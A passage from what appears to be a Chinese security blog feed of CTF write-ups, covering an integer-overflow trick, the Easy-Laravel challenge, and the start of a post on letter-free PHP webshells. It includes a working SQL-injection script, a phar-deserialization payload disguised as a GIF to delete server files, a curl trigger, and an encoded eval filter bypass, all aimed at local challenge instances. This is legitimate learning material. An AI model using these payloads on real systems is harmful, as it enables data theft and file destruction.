class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造溢出 <a href="/images/2018/10/2018-10-15-13-40-01屏幕截图.png"><img src="/images/2018/10/2018-10-15-13-40-01屏幕截图.png" /></a> 我们填3689348814741910324,那么算的时候<code>3689348814741910324 * 5</code>溢出,数值小于我们辣条数量,兑换成功,那么直接去换flag就ok</p><h2 id="easy_web">easy_web</h2><p>java题... 后续可能专门写一篇博客,看情况了.... 然后天枢的wp <a href="/images/2018/10/20181014171439-941dc498-cf91-1.png"><img src="/images/2018/10/20181014171439-941dc498-cf91-1-1024x552.png" /></a> sky的wp <a href="/images/2018/10/B23978EFC504FD81383F78A38BD16060.png"><img src="/images/2018/10/B23978EFC504FD81383F78A38BD16060.png" /></a></p><h2 id="easy-laravel">Easy-Laravel</h2><h3 id="源码泄漏">源码泄漏</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- code: https://github.com/qqqqqqvq/easy_laravel --&gt;</span><br></pre></td></tr></table></figure><p>虽然已经没有这个仓库了,我们可以去官方仓库看源码</p><h3 id="注入">注入</h3><p>note存在注入 <a href="/images/2018/10/2018-10-18-15-44-53屏幕截图.png"><img src="/images/2018/10/2018-10-18-15-44-53屏幕截图.png" /></a> 注册的用户名没有限制,自己跑就好,这里我写了个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">init_num = random.randint(<span class="number">1</span>,<span class="number">100000000000000</span>)</span><br><span class="line">u = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    init_num += <span class="number">1</span></span><br><span class="line">    username = <span class="string">&quot;admin&#x27; union select 1,(&quot;</span> + <span class="built_in">input</span>(<span class="string">&#x27;input:&#x27;</span>) + <span class="string">&#x27;),3,4,5#&#x27;</span></span><br><span class="line"></span><br><span class="line">    r = u.get(<span class="string">&#x27;http://127.0.0.1/register&#x27;</span>)</span><br><span class="line">    token = re.findall(<span class="string">&#x27;name=&quot;_token&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span>, r.text)</span><br><span class="line">    email = <span class="built_in">str</span>(init_num) + <span class="string">&#x27;@qq.com&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;_token&#x27;</span> : token[<span class="number">0</span>],</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> : username,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> : email,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> : email,</span><br><span class="line">        <span class="string">&#x27;password_confirmation&#x27;</span> : email</span><br><span class="line">    &#125;</span><br><span class="line">    r = u.post(<span class="string">&#x27;http://127.0.0.1/register&#x27;</span>, data = data)</span><br><span class="line">    r = u.get(<span class="string">&#x27;http://127.0.0.1/note&#x27;</span>)</span><br><span class="line">    text = re.findall(<span class="string">&#x27;&lt;div class=&quot;col-xs-10&quot;&gt;([^&lt;]+)&lt;/div&gt;&#x27;</span>, r.text)</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    u.post(<span class="string">&#x27;http://127.0.0.1/logout&#x27;</span>, data = &#123;<span class="string">&#x27;_token&#x27;</span> : token&#125;)</span><br></pre></td></tr></table></figure><p>不过好像不能用information_schema,那么就直接查看数据库里面有什么东西 <a href="/images/2018/10/2018-10-18-15-51-19屏幕截图.png"><img src="/images/2018/10/2018-10-18-15-51-19屏幕截图.png" /></a> 读一下密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input:select password from users limit 0,1</span><br><span class="line">[&#x27; $2y$10$rY8DAmSEJ99Au5pL.vCQ2eGdAAUek/hGMm.trPDpgK6KBAvddiy32 &#x27;]</span><br></pre></td></tr></table></figure><p>似乎并不能解,那么怎么办呢,我们可以看到前面还有密码重置,我们去重置密码</p><h3 id="重置密码">重置密码</h3><p>直接reset页面重置会报错 <a href="/images/2018/10/2018-10-18-16-01-25屏幕截图.png"><img src="/images/2018/10/2018-10-18-16-01-25屏幕截图.png" /></a> 然后这里学习了一下laravel... 首先www目录有一个<code>composer.json</code>,那我们先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer install</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-18-16-59-21屏幕截图.png"><img src="/images/2018/10/2018-10-18-16-59-21屏幕截图.png" /></a> 然后<code>php artisan route:list</code> <a href="/images/2018/10/2018-10-18-17-00-31屏幕截图.png"><img src="/images/2018/10/2018-10-18-17-00-31屏幕截图-1024x349.png" /></a> 我们可以看到有个<code>password/reset/&#123;token&#125;</code> 这里其实是出题人设计过的</p><blockquote><p>这里是直接把生成出来的token写入了数据库中，所以我在开头放了一个注入，本意就是注入出这个token去重置admin@qvq.im的密码，可是好像很多人都被users表里的remember_token误导了，这也是使用 Laravel 5.4的原因，在高于5.4的版本中，重置密码这个 token 会被 bcrypt 再存入，就和用户密码一样</p></blockquote><p>先发送一下链接,然后读token <a href="/images/2018/10/2018-10-18-17-21-17屏幕截图.png"><img src="/images/2018/10/2018-10-18-17-21-17屏幕截图.png" /></a> 登录成功 <a href="/images/2018/10/2018-10-18-17-20-31屏幕截图.png"><img src="/images/2018/10/2018-10-18-17-20-31屏幕截图.png" /></a> 按道理来说现在查看flag就应该拿到flag了,但是并没有 <a href="/images/2018/10/2018-10-18-17-22-25屏幕截图.png"><img src="/images/2018/10/2018-10-18-17-22-25屏幕截图.png" /></a> 结合题目提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blade expired</span><br><span class="line">pop chain</span><br><span class="line">blade模板</span><br></pre></td></tr></table></figure><p>blade模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/7d65f9eb94be</span><br></pre></td></tr></table></figure><p>blade是laravel的一个模板引擎.它不像其他流行的 PHP 模板引擎那样限制你在视图中使用原生的 PHP 代码，事实上它就是把 Blade 视图编译成原生的 PHP 代码并缓存起来。缓存会在 Blade 视图改变时而改变，这意味着 Blade 并没有给你的应用添加编译的负担。 所以我们这的思路很清晰： 1.因为旧的缓存存在，导致我们看不到flag 2.我们可以利用pop chain删掉缓存文件 3.读到flag 它的模板文件放在了<code>resources/views</code>下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@be1168dd87c7:/usr/share/nginx/html/resources/views<span class="comment"># ls -lsa</span></span><br><span class="line">total 44</span><br><span class="line">4 drwxr-xr-x 6 root root 4096 Oct 17 17:45 .</span><br><span class="line">4 drwxr-xr-x 5 root root 4096 Oct 17 17:45 ..</span><br><span class="line">4 drwxr-xr-x 3 root root 4096 Oct 17 17:45 auth</span><br><span class="line">4 drwxr-xr-x 2 root root 4096 Oct 17 17:45 errors</span><br><span class="line">4 -rw-r--r-- 1 root root 1054 Oct 17 17:45 files.blade.php</span><br><span class="line">4 -rw-r--r-- 1 root root  410 Oct 17 17:45 home.blade.php</span><br><span class="line">4 drwxr-xr-x 2 root root 4096 Oct 17 17:45 layouts</span><br><span class="line">4 -rw-r--r-- 1 root root  558 Oct 17 17:45 note.blade.php</span><br><span class="line">4 -rw-r--r-- 1 root root 1014 Oct 17 17:45 upload.blade.php</span><br><span class="line">4 drwxr-xr-x 3 root root 4096 Oct 17 17:45 vendor</span><br><span class="line">4 -rw-r--r-- 1 root root 2213 Oct 17 17:45 welcome.blade.php</span><br></pre></td></tr></table></figure><p>编译之后放在了<code>storage/framework/views</code> <a href="/images/2018/10/2018-10-18-17-37-59屏幕截图.png"><img src="/images/2018/10/2018-10-18-17-37-59屏幕截图.png" /></a> 它的过期判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isExpired</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$compiled</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCompiledPath</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the compiled file doesn&#x27;t exist we will indicate that the view is expired</span></span><br><span class="line">    <span class="comment">// so that it can be re-compiled. Else, we will verify the last modification</span></span><br><span class="line">    <span class="comment">// of the views is less than the modification times of the compiled views.</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable language_">$this</span>-&gt;files-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$compiled</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$lastModified</span> = <span class="variable language_">$this</span>-&gt;files-&gt;<span class="title function_ invoke__">lastModified</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lastModified</span> &gt;= <span class="variable language_">$this</span>-&gt;files-&gt;<span class="title function_ invoke__">lastModified</span>(<span class="variable">$compiled</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后存放路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCompiledPath</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cachePath.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$path</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>cachePath在哪呢?前面的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx是坠吼的 ( 好麻烦，默认配置也是坠吼的</span><br></pre></td></tr></table></figure><p>那么说明路径就是<code>/usr/share/nginx/html</code> 但是要怎么删除呢?</p><h3 id="phar反序列化">phar反序列化</h3><p>看到upload的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">middleware</span>([<span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="title function_ invoke__">storage_path</span>(<span class="string">&#x27;app/public&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">UploadRequest <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$file</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isValid</span>())) &#123;</span><br><span class="line">            <span class="variable">$allowed_extensions</span> = [<span class="string">&quot;bmp&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>];</span><br><span class="line">            <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>))&#123;</span><br><span class="line">                <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">move</span>(<span class="variable">$this</span>-&gt;path, <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>());</span><br><span class="line">                <span class="title class_">Flash</span>::<span class="title function_ invoke__">success</span>(<span class="string">&#x27;上传成功&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">route</span>(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Flash</span>::<span class="title function_ invoke__">error</span>(<span class="string">&#x27;上传失败&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">route</span>(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">files</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">array_except</span>(<span class="title class_">Storage</span>::<span class="title function_ invoke__">allFiles</span>(<span class="string">&#x27;public&#x27;</span>), [<span class="string">&#x27;0&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;files&#x27;</span>)-&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;files&#x27;</span>, <span class="variable">$files</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;path&#x27;</span>, <span class="variable">$this</span>-&gt;path);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>))&#123;</span><br><span class="line">                <span class="title class_">Flash</span>::<span class="title function_ invoke__">error</span>(<span class="string">&#x27;磁盘文件已删除，刷新文件列表&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title class_">Flash</span>::<span class="title function_ invoke__">success</span>(<span class="string">&#x27;文件有效&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">route</span>(<span class="string">&#x27;files&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现check里面用到了file_exists,路径也确定,上传的时候要求为image,改一个头就过了 那么现在就要找一个可以触发删除文件的类 <a href="/images/2018/10/2018-10-18-18-12-30屏幕截图.png"><img src="/images/2018/10/2018-10-18-18-12-30屏幕截图-1024x464.png" /></a> 然后我们在<code>swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php</code>找到可用类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filePath</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;FileByteStream&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filePath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Swift_IoException</span>(<span class="string">&#x27;Failed to retrieve temporary file name.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$filePath</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getPath</span>())) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Swift_IoException</span>(<span class="string">&#x27;Failed to get temporary file content.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getPath</span>())) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getPath</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;autoload.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Swift_ByteStream_TemporaryFileByteStream</span>());</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\/tmp\/FileByteStream[a-zA-Z0-9]&#123;6&#125;/&#x27;</span>, <span class="string">&quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;</span>, <span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:25&#x27;</span>, <span class="string">&#x27;s:90&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;./blacsheep.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">    <span class="title function_ invoke__">rename</span>(<span class="string">&#x27;blacsheep.phar&#x27;</span>, <span class="string">&#x27;blacsheep.gif&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传上去之后curl来check一下触发删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/home/blacsheep  $ curl -X POST --data <span class="string">&quot;path=phar:///usr/share/nginx/html/storage/app/public&amp;filename=/blacsheep.gif&amp;_token=H1zLI745JltuZPTvk19zfm0BDzaMScRv4Sghq6bx&quot;</span> --cookie <span class="string">&quot;XSRF-TOKEN=eyJpdiI6IjEydHFndGVRdGFiVU1RdzFjNElIWUE9PSIsInZhbHVlIjoiMUJJYjJYSk5pWGExR1RVVjFOUnBXdVNKckdTMnhxUjdVb1grTytJMW1uUGo1NmlGY0FJSXpiRlBCb2hmRXFmR0lYYm1RdG55V2RJUVB1eU5iNkFOQ3c9PSIsIm1hYyI6IjYxMjVhNDE1NjAyZjJkMDViZDQyYTRjYjc4Y2YzNTUxY2Y0MWUxNjAzODZiNzJmNDllYWUzYTRiM2MyZDY1YmMifQ%3D%3D; laravel_session=eyJpdiI6ImtDOEpVMmtNRHVXQlR1SWJER0d4bnc9PSIsInZhbHVlIjoiNURxNUE5REFUT0tvNTVWM1hMYVZZRjQyemdKZ2tTM2pZQ0J6cDNiSkpOTys4QmhjelozQ0lTYmYwa1VyWlA0eTRENkloajBKbVV5aWN6MEpVaTNaWEE9PSIsIm1hYyI6IjZhNDVkMDFlN2M0MDYzODRmM2NlYTBiZDEyMmFhZmQyMGVjMzU5YjQ3ZTc4OTkyZmU5YjRjMjgxMTE1NTk5MWUifQ%3D%3D&quot;</span> <span class="string">&#x27;http://127.0.0.1/check&#x27;</span></span><br></pre></td></tr></table></figure><p>拿到flag <a href="/images/2018/10/2018-10-18-18-54-30屏幕截图.png"><img src="/images/2018/10/2018-10-18-18-54-30屏幕截图.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>无字母数字webshell学习</title>
      <link href="/2018/10/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/10/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>安恒月赛的题目,被p神拿出来分析了一下,趁机学习一下新知识</p><h2 id="源码">源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用这个可以执行任意代码吗?理论是可以的</p><h2 id="php7">php7</h2><p>给出一个php的间接使用变量属性方法的表 <a href="/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af.png"><img src="/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af-300x151.png" /></a> php7允许使用<code>($a)();</code>执行函数,举个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8F%97%8F%96%91%99%90 &lt;=&gt; urlencode(~&#x27;phpinfo&#x27;)</span><br></pre></td></tr></table></figure><p>那么我们把左边取反输入到code <a href="/images/2018/10/2018-10-09-19-11-02屏幕截图.png"><img src="/images/2018/10/2018-10-09-19-11-02屏幕截图-300x207.png" /></a> 